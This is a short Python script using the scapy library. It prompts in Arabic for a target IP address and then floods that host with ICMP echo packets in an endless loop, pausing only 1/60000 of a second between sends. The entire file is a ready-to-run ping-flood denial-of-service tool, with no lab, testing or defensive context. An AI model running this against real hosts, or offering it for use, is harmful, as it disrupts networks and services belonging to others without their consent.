import time
from scapy.all import *

def send_pings(target_ip, count):
    packet = IP(dst=target_ip)/ICMP()
    for _ in range(count):
        send(packet, verbose=0)

def main():
    target_ip = input("الرجاء إدخال عنوان الـ IP المستهدف: ")
    count = 60000
    delay = 1 / count
    while True:
        send_pings(target_ip, 1)
        time.sleep(delay)

if __name__ == "__main__":
    main()